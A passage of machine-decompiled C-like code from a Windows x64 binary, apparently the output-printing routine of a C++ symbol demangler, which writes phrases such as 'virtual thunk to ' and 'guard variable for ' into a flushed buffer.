(pcVar36 != \"\");\n        break;\n    case 0x140008da5:\n        pcVar36 = \"[abi:\";\n        uStack256 = 0x140008dbe;\n        fcn.14000b4c0(arg1, 0x11, *(arg3 + 4));\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140008e1d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        goto code_r0x00014000a0c0;\n    case 0x140008e2d:\n        uVar22 = *(arg3 + 4);\n        uVar38 = 0;\n        uStack256 = 0x140008e3c;\n        piVar19 = fcn.140004e80(arg1, uVar22);\n        if (piVar19 != NULL) {\n            while ((*piVar19 == 0x2f && (*(piVar19 + 4) != 0))) {\n                piVar19 = *(piVar19 + 6);\n                uVar38 = uVar38 + 1;\n                if (piVar19 == NULL) {\ncode_r0x000140008e72:\n                    do {\n                        iVar14 = uVar35;\n                        *(arg1 + 0x13c) = iVar14;\n                        uStack256 = 0x140008ea2;\n                        fcn.14000b4c0(arg1, 0x11, uVar22);\n                        if (iVar14 < uVar38 - 1) {\n                            puVar34 = 0x1400ff630;\n                            iVar15 = *(arg1 + 0x100);\n                            do {\n                                uVar27 = *puVar34;\n                                if (iVar15 == 0xff) {\n                                    arg1[0xff] = 0;\n                                    uStack256 = 0x140008f0a;\n                                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                                    iVar18 = 1;\n                                    iVar15 = 0;\n                                }\n                                else {\n                                    iVar18 = iVar15 + 1;\n                                }\n                                puVar34 = puVar34 + 1;\n                                *(arg1 + 0x100) = iVar18;\n                                arg1[iVar15] = uVar27;\n                                arg1[0x108] = uVar27;\n                                iVar15 = iVar18;\n                            } while (puVar34 != 0x1400ff632);\n                        }\n                        uVar35 = iVar14 + 1U;\n                    } while (iVar14 + 1U != uVar38);\n                    return;\n                }\n            }\n            if (uVar38 == 0) {\n                return;\n            }\n            goto code_r0x000140008e72;\n        }\n        uStack256 = 0x14000b0ad;\n        fcn.14000ce50(arg1, 0x11, uVar22);\n        pcVar36 = 0x1400ff68a;\ncode_r0x000140004de0:\n        *(*0x20 + -8) = unaff_RBP;\n        *(*0x20 + -0x10) = unaff_RDI;\n        *(*0x20 + -0x18) = unaff_RSI;\n        *(*0x20 + -0x20) = unaff_RBX;\n        *(*0x20 + -0x50) = 0x140004df6;\n        iVar15 = sub.msvcrt.dll_strlen(pcVar36);\n        if (iVar15 != 0) {\n            pcVar31 = pcVar36 + iVar15;\n            iVar15 = *(arg1 + 0x100);\n            do {\n                cVar1 = *pcVar36;\n                if (iVar15 == 0xff) {\n                    arg1[0xff] = 0;\n                    uVar22 = *(arg1 + 0x118);\n                    pcVar3 = *(arg1 + 0x110);\n                    *(*0x20 + -0x50) = 0x140004e5a;\n                    (*pcVar3)(arg1, 0xff, uVar22);\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar18 = 1;\n                    iVar15 = 0;\n                }\n                else {\n                    iVar18 = iVar15 + 1;\n                }\n                pcVar36 = pcVar36 + 1;\n                *(arg1 + 0x100) = iVar18;\n                arg1[iVar15] = cVar1;\n                arg1[0x108] = cVar1;\n                iVar15 = iVar18;\n            } while (pcVar31 != pcVar36);\n        }\n        return;\n    case 0x140008f1a:\n        pcVar36 = \"non-transaction clone for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140008f7d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x140008f8d:\n        pcVar36 = \"transaction clone for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140008ff5;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x140009005:\n        pcVar36 = \"{unnamed type#\";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000906d;\n                (**(arg1 + 0x110))(arg1);\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        puVar34 = &stack0xffffffffffffff38;\n        uStack256 = 0x14000a4c3;\n        fcn.140004c90(puVar34, 0x1400ff08c, arg3[4] + 1, in_R9);\n        uStack256 = 0x14000a4cb;\n        iVar18 = sub.msvcrt.dll_strlen(puVar34);\n        iVar15 = *(arg1 + 0x100);\n        if (iVar18 != 0) {\n            puVar33 = puVar34 + iVar18;\n            iVar18 = iVar15;\n            do {\n                uVar27 = *puVar34;\n                if (iVar18 == 0xff) {\n                    arg1[0xff] = 0;\n                    uStack256 = 0x14000a52e;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar15 = 1;\n                    iVar18 = 0;\n                }\n                else {\n                    iVar15 = iVar18 + 1;\n                }\n                puVar34 = puVar34 + 1;\n                *(arg1 + 0x100) = iVar15;\n                arg1[iVar18] = uVar27;\n                arg1[0x108] = uVar27;\n                iVar18 = iVar15;\n            } while (puVar33 != puVar34);\n        }\ncode_r0x00014000a480:\n        if (iVar15 == 0xff) {\n            arg1[0xff] = 0;\n            uStack256 = 0x14000a870;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar18 = 1;\n            iVar15 = 0;\n        }\n        else {\n            iVar18 = iVar15 + 1;\n        }\n        *(arg1 + 0x100) = iVar18;\n        arg1[iVar15] = 0x7d;\n        arg1[0x108] = 0x7d;\n        return;\n    case 0x14000907d:\n        pcVar36 = \"{lambda(\";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x1400090e5;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n        puVar34 = 0x1400ff6de;\n        uStack256 = 0x14000a378;\n        fcn.14000b4c0(arg1, 0x11, *(arg3 + 4));\n        *(arg1 + 0x138) = *(arg1 + 0x138) + -1;\n        iVar15 = *(arg1 + 0x100);\n        do {\n            uVar27 = *puVar34;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000a3d9;\n                (**(arg1 + 0x110))(arg1);\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            puVar34 = puVar34 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = uVar27;\n            arg1[0x108] = uVar27;\n            iVar15 = iVar18;\n        } while (puVar34 != 0x1400ff6e0);\n        puVar34 = &stack0xffffffffffffff38;\n        uStack256 = 0x14000a404;\n        fcn.140004c90(puVar34, 0x1400ff08c, arg3[6] + 1, in_R9);\n        uStack256 = 0x14000a40c;\n        iVar18 = sub.msvcrt.dll_strlen(puVar34);\n        iVar15 = *(arg1 + 0x100);\n        if (iVar18 != 0) {\n            puVar33 = puVar34 + iVar18;\n            iVar18 = iVar15;\n            do {\n                uVar27 = *puVar34;\n                if (iVar18 == 0xff) {\n                    arg1[0xff] = 0;\n                    uStack256 = 0x14000a46a;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar15 = 1;\n                    iVar18 = 0;\n                }\n                else {\n                    iVar15 = iVar18 + 1;\n                }\n                puVar34 = puVar34 + 1;\n                *(arg1 + 0x100) = iVar15;\n                arg1[iVar18] = uVar27;\n                arg1[0x108] = uVar27;\n                iVar18 = iVar15;\n            } while (puVar34 != puVar33);\n        }\n        goto code_r0x00014000a480;\n    case 0x1400090f5:\n        pcVar36 = \"global destructors keyed to \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000915d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000916d:\n        pcVar36 = \"global constructors keyed to \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x1400091d5;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x1400091e5:\n        if (**(arg3 + 6) == 0x39) {\n            pcVar36 = **(*(arg3 + 4) + 0x10);\n            if ((pcVar36[1] == 'c') && ((cVar1 = *pcVar36,  cVar1 + 0x9dU < 2 || (cVar1 + 0x8eU < 2)))) {\n                uStack256 = 0x14000af53;\n                fcn.14000c7c0(arg1, 0x11, *(arg3 + 4));\n                uVar27 = 0x3c;\n                *0x20 = &stack0xffffffffffffff00;\n                uStack256 = 0x14000af60;\n                unaff_RBX = arg1;\n                unaff_RSI = arg3;\n            }\n            else {\n                uStack256 = 0x140009217;\n                iVar14 = fcn.14000d000(arg1, 0x11, arg3);\n                if (iVar14 != 0) {\n                    return;\n                }\n                uStack256 = 0x14000922f;\n                iVar14 = fcn.14000d390(arg1, 0x11, arg3);\n                if (iVar14 != 0) {\n                    return;\n                }\n                piVar19 = *(arg3 + 4);\n                if (((*piVar19 == 0x32) && (*(*(piVar19 + 4) + 0x10) == 1)) && (**(*(piVar19 + 4) + 8) == '>')) {\n                    uVar27 = 0x28;\n                    *0x20 = &stack0xffffffffffffff00;\n                    uStack256 = 0x14000b2f4;\n                    unaff_RBX = arg1;\n                    unaff_RSI = arg3;\n                }\n                else {\n                    uStack256 = 0x14000925a;\n                    iVar14 = sub.msvcrt.dll_strcmp(**(piVar19 + 4), 0x1400ff649);\n                    piVar19 = *(*(arg3 + 6) + 0x10);\n                    if ((iVar14 == 0) && (*piVar19 == 3)) {\n                        if (**(piVar19 + 6) != 0x29) {\n                            *(arg1 + 0x130) = 1;\n                        }\n                        uStack256 = 0x14000b497;\n                        fcn.14000ce50(arg1, 0x11, *(piVar19 + 4));\n                    }\n                    else {\n                        uStack256 = 0x14000927d;\n                        fcn.14000ce50(arg1, 0x11, piVar19);\n                    }\n                    iVar15 = *(arg3 + 4);\n                    uVar22 = **(iVar15 + 0x10);\n                    uStack256 = 0x140009297;\n                    iVar14 = sub.msvcrt.dll_strcmp(uVar22, 0x1400ff64c);\n                    if (iVar14 == 0) {\n                        uVar27 = 0x5b;\n                        *0x20 = &stack0xffffffffffffff00;\n                        uStack256 = 0x14000b313;\n                        unaff_RBX = arg1;\n                        unaff_RSI = arg3;\n                    }\n                    else {\n                        uStack256 = 0x1400092aa;\n                        iVar14 = sub.msvcrt.dll_strcmp(uVar22, 0x1400ff649);\n                        if (iVar14 != 0) {\n                            uStack256 = 0x14000b462;\n                            fcn.14000c7c0(arg1, 0x11, iVar15);\n                        }\n                        uStack256 = 0x1400092c7;\n                        fcn.14000ce50(arg1, 0x11, *(*(arg3 + 6) + 0x18));\n                        if (**(arg3 + 4) != 0x32) {\n                            return;\n                        }\n                        iVar15 = *(*(arg3 + 4) + 4);\n                        if (*(iVar15 + 0x10) != 1) {\n                            return;\n                        }\n                        uVar27 = 0x29;\n                        if (**(iVar15 + 8) != '>') {\n                            return;\n                        }\n                    }\n                }\n            }\n            goto code_r0x000140004d10;\n        }\ncode_r0x000140008400:\n        *(arg1 + 0x130) = 1;\n        return;\n    case 0x14000930f:\n        puVar37 = *(arg3 + 4);\n        unaff_RSI = *(arg3 + 6);\n        if (*puVar37 == 0x32) {\n            puVar7 = **(puVar37 + 4);\n            uVar28 = *puVar7;\n            uVar38 = uVar28 - 0x61;\n            if ((uVar38 == 0) && (uVar38 = puVar7[1] - 100,  uVar38 == 0)) {\n                uVar38 = puVar7[2];\n            }\n            if ((uVar38 == 0) && (*unaff_RSI == 3)) {\n                if ((**(unaff_RSI + 4) == 1) && (**(unaff_RSI + 6) == 0x29)) {\n                    unaff_RSI = *(unaff_RSI + 4);\n                }\n            }\n            else if (*unaff_RSI == 0x39) {\n                uStack256 = 0x14000b3d8;\n                fcn.14000ce50(arg1, 0x11, *(unaff_RSI + 4));\n                goto code_r0x00014000935f;\n            }\n            if (uVar28 == 0x73) {\n                if ((puVar7[1] == 0x5a) && (puVar7[2] == 0)) {\n                    uStack256 = 0x14000a9f1;\n                    uVar22 = fcn.140004e80(arg1, unaff_RSI);\n                    uStack256 = 0x14000a9f9;\n                    uVar38 = fcn.140004b90(uVar22);\ncode_r0x000140005010:\n                    puVar34 = &stack0xffffffffffffffb8;\n                    uStack112 = 0x140005032;\n                    fcn.140004c90(puVar34, 0x1400ff08c, uVar38, in_R9);\n                    uStack112 = 0x14000503a;\n                    iVar15 = sub.msvcrt.dll_strlen(puVar34);\n                    if (iVar15 != 0) {\n                        puVar33 = puVar34 + iVar15;\n                        iVar15 = *(arg1 + 0x100);\n                        do {\n                            uVar27 = *puVar34;\n                            if (iVar15 == 0xff) {\n                                arg1[0xff] = 0;\n                                uStack112 = 0x14000509a;\n                                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                                iVar18 = 1;\n                                iVar15 = 0;\n                            }\n                            else {\n                                iVar18 = iVar15 + 1;\n                            }\n                            puVar34 = puVar34 + 1;\n                            *(arg1 + 0x100) = iVar18;\n                            arg1[iVar15] = uVar27;\n                            arg1[0x108] = uVar27;\n                            iVar15 = iVar18;\n                        } while (puVar34 != puVar33);\n                    }\n                    return;\n                }\n                if (((uVar28 == 0x73) && (puVar7[1] == 0x50)) && (uVar38 = 0,  puVar7[2] == 0)) {\n                    do {\n                        if ((*unaff_RSI != 0x2f) || (piVar19 = *(unaff_RSI + 4),  piVar19 == NULL)) break;\n                        if (*piVar19 == 0x4c) {\n                            uStack256 = 0x14000b168;\n                            piVar19 = fcn.140004e80(arg1, *(piVar19 + 4));\n                            iVar14 = 0;\n                            for (; ((piVar19 != NULL && (*piVar19 == 0x2f)) && (*(piVar19 + 4) != 0));\n                                piVar19 = *(piVar19 + 6)) {\n                                iVar14 = iVar14 + 1;\n                            }\n                            uVar38 = uVar38 + iVar14;\n                        }\n                        else {\n                            uVar38 = uVar38 + 1;\n                        }\n                        unaff_RSI = *(unaff_RSI + 6);\n                    } while (unaff_RSI != NULL);\n                    goto code_r0x000140005010;\n                }\n            }\n            uStack256 = 0x14000aa26;\n            fcn.14000c7c0(arg1, 0x11, puVar37);\n            if (((*puVar7 == 0x67) && (puVar7[1] == 0x73)) && (puVar7[2] == 0)) goto code_r0x00014000b4c0;\n            if (((*puVar7 == 0x73) && (puVar7[1] == 0x74)) && (puVar7[2] == 0)) {\n                uVar27 = 0x28;\n                *0x20 = &stack0xffffffffffffff00;\n                uStack256 = 0x14000aa6c;\n                unaff_RBX = arg1;\n                goto code_r0x000140004d10;\n            }\n        }\n        else {\n            if (*puVar37 == 0x34) {\n                iVar15 = *(arg1 + 0x100);\n                if (iVar15 == 0xff) {\n                    arg1[0xff] = 0;\n                    uStack256 = 0x14000b2b6;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar15 = 0;\n                }\n                *(arg1 + 0x100) = iVar15 + 1;\n                arg1[iVar15] = 0x28;\n                arg1[0x108] = 0x28;\n                uStack256 = 0x14000ab0d;\n                fcn.14000b4c0(arg1, 0x11, *(puVar37 + 4));\n                uVar27 = 0x29;\n                *0x20 = &stack0xffffffffffffff00;\n                uStack256 = 0x14000ab1a;\n                unaff_RBX = arg1;\n                goto code_r0x000140004d10;\n            }\n            uStack256 = 0x140009338;\n            fcn.14000c7c0(arg1, 0x11, puVar37);\n        }\n        uVar38 = *unaff_RSI;\n        if (((uVar38 < 2) || (uVar38 == 0x31)) || (uVar38 == 6)) {\n            uVar38 = unaff_RSI[1];\n            if (1 < uVar38) {\ncode_r0x00014000cf20:\n                *(arg1 + 0x130) = 1;\n                return;\n            }\n            iVar14 = *(arg1 + 0x134);\n            bVar13 = true;\n            if (0x400 < iVar14) goto code_r0x00014000cf20;\n        }\n        else {\n            iVar15 = *(arg1 + 0x100);\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack80 = 0x14000cfd9;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = 0x28;\n            arg1[0x108] = 0x28;\n            uVar38 = unaff_RSI[1];\n            if ((1 < uVar38) || (iVar14 = *(arg1 + 0x134),  0x400 < iVar14)) {\n                *(arg1 + 0x130) = 1;\n                goto code_r0x00014000cef4;\n            }\n            bVar13 = false;\n        }\n        unaff_RSI[1] = uVar38 + 1;\n        uVar22 = *(arg1 + 0x148);\n        *(arg1 + 0x134) = iVar14 + 1;\n        *(arg1 + 0x148) = &stack0xffffffffffffffd8;\n        uStack80 = 0x14000ced2;\n        fcn.1400083b0(arg1, 0x11, unaff_RSI);\n        *(arg1 + 0x148) = uVar22;\n        unaff_RSI[1] = unaff_RSI[1] - 1;\n        *(arg1 + 0x134) = *(arg1 + 0x134) + -1;\n        if (bVar13) {\n            return;\n        }\n        iVar18 = *(arg1 + 0x100);\ncode_r0x00014000cef4:\n        if (iVar18 == 0xff) {\n            arg1[0xff] = 0;\n            uStack80 = 0x14000cfac;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar15 = 1;\n            iVar18 = 0;\n        }\n        else {\n            iVar15 = iVar18 + 1;\n        }\n        *(arg1 + 0x100) = iVar15;\n        arg1[iVar18] = 0x29;\n        arg1[0x108] = 0x29;\n        return;\n    case 0x14000935b:\n        puVar37 = *(arg3 + 4);\ncode_r0x00014000935f:\n        unaff_RSI = puVar37;\n        if (*puVar37 == 0x32) {\n            iVar15 = *(*(puVar37 + 4) + 0x10);\n            puVar34 = *(*(puVar37 + 4) + 8);\n            if (iVar15 != 0) {\n                puVar33 = puVar34 + iVar15;\n                iVar15 = *(arg1 + 0x100);\n                do {\n                    uVar27 = *puVar34;\n                    if (iVar15 == 0xff) {\n                        arg1[0xff] = 0;\n                        uStack80 = 0x14000c851;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                        iVar18 = 1;\n                        iVar15 = 0;\n                    }\n                    else {\n                        iVar18 = iVar15 + 1;\n                    }\n                    puVar34 = puVar34 + 1;\n                    *(arg1 + 0x100) = iVar18;\n                    arg1[iVar15] = uVar27;\n                    arg1[0x108] = uVar27;\n                    iVar15 = iVar18;\n                } while (puVar34 != puVar33);\n            }\n            return;\n        }\n        goto code_r0x00014000b4c0;\n    case 0x14000937f:\n        pcVar36 = \"template parameter object for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x1400093e5;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x1400093f5:\n        pcVar36 = \"reference temporary #\";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000945d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        pcVar36 = \" for \";\n        uStack256 = 0x14000a15c;\n        fcn.14000b4c0(arg1, 0x11, *(arg3 + 6));\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000a1b5;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000946d:\n        if (*(arg3 + 0x1a) == 0) {\n            if (*(*(arg3 + 4) + 0x10) != 0x140100800) {\n                uStack256 = 0x140009497;\n                fcn.14000b4c0(arg1, 0x11, *(arg3 + 4));\n                iVar15 = *(arg1 + 0x100);\n                if (iVar15 == 0xff) {\n                    arg1[0xff] = 0;\n                    uStack256 = 0x14000b0fa;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar15 = 0;\n                }\n                *(arg1 + 0x100) = iVar15 + 1;\n                arg1[iVar15] = 0x20;\n                arg1[0x108] = 0x20;\n            }\n            pcVar36 = \"_Accum\";\n            if (*(arg3 + 6) == 0) {\n                pcVar36 = \"_Fract\";\n            }\n        }\n        else {\n            pcVar36 = \"_Sat \";\n            *0x20 = &stack0xffffffffffffff00;\n            uStack256 = 0x14000aab9;\n            unaff_RBX = arg1;\n            unaff_RBP = uVar35;\n            unaff_RSI = arg3;\n        }\n        goto code_r0x000140004de0;\n    case 0x1400094de:\n        uVar22 = *(arg1 + 0x170);\n        uVar4 = *(arg1 + 0x128);\n        *(arg1 + 0x170) = arg3;\n        *(arg1 + 0x128) = 0;\n        uStack256 = 0x14000950c;\n        fcn.14000b4c0(arg1, 0x11, *(arg3 + 4));\n        if (arg1[0x108] == '<') {\n            uVar27 = 0x20;\n            *0x20 = &stack0xffffffffffffff00;\n            uStack256 = 0x14000ad96;\n            unaff_RBX = arg1;\n            unaff_RSI = arg3;\n        }\n        else {\n            iVar15 = *(arg1 + 0x100);\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x14000ad76;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = 0x3c;\n            arg1[0x108] = 0x3c;\n            uStack256 = 0x140009553;\n            fcn.14000b4c0(arg1, 0x11, *(arg3 + 6));\n            if (arg1[0x108] != '>') {\n                iVar15 = *(arg1 + 0x100);\n                if (iVar15 == 0xff) {\n                    arg1[0xff] = 0;\n                    uStack256 = 0x14000ad35;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar18 = 1;\n                    iVar15 = 0;\n                }\n                else {\n                    iVar18 = iVar15 + 1;\n                }\n                *(arg1 + 0x100) = iVar18;\n                arg1[iVar15] = 0x3e;\n                arg1[0x108] = 0x3e;\n                *(arg1 + 0x128) = uVar4;\n                *(arg1 + 0x170) = uVar22;\n                return;\n            }\n            uVar27 = 0x20;\n            *0x20 = &stack0xffffffffffffff00;\n            uStack256 = 0x14000ad55;\n            unaff_RBX = arg1;\n            unaff_RSI = arg3;\n        }\n        goto code_r0x000140004d10;\n    case 0x14000959c:\n        pcVar36 = \"guard variable for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x1400095fd;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x14000960d:\n        pcVar36 = \"java Class for \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140009675;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x140009685:\n        pcVar36 = \"covariant return thunk to \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x1400096ed;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar18 = 1;\n                iVar15 = 0;\n            }\n            else {\n                iVar18 = iVar15 + 1;\n            }\n            pcVar36 = pcVar36 + 1;\n            *(arg1 + 0x100) = iVar18;\n            arg1[iVar15] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar15 = iVar18;\n        } while (pcVar36 != \"\");\n        break;\n    case 0x1400096fd:\n        pcVar36 = \"virtual thunk to \";\n        iVar15 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar36;\n            if (iVar15 == 0xff) {\n                arg1[0xff] = 0;\n                uStack256 = 0x140009765;\n                (**(arg1 + 0x110))(arg1, 0xff, 